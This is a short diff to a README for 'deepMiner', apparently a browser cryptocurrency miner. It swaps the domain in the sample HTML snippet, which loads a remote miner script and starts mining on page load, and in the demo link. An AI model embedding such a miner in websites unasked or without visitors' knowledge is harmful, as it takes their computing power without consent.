@@ -20,7 +20,7 @@
 * Add some javascript and write like this :
 
 ```html
-<script src="https://deepc.cc/deepMiner.js"></script>
+<script src="https://digxmr.com/deepMiner.js"></script>
 <script>
     var miner = new deepMiner.Anonymous('deepMiner_test').start();
 </script>
@@ -63,7 +63,7 @@ If not a bug just Qus in something setting or in install. Please write down at <
 
 ## Example & Some tips
 
-<https://deepc.cc/demo.html>
+<https://digxmr.com/demo.html>
 
 Tips:
 
